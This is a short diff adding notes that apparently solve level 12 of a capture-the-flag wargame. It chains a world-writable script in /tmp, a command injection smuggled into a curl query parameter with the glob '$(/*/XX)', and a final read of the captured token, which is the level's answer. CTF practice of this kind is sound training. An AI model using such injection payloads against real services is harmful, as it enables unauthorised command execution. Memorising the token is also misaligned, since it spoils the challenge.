@@ -1,0 +1,9 @@
+LEVEL12
+ls
+-> level12.pl
+cat level12
+echo "getflag > /tmp/token" > /tmp/XX
+chmod 777 /tmp/XX
+curl http://localhost:4646?x='$(/*/XX)'
+cat /tmp/token
+-> token: fa6v5ateaw21peobuub8ipe6s
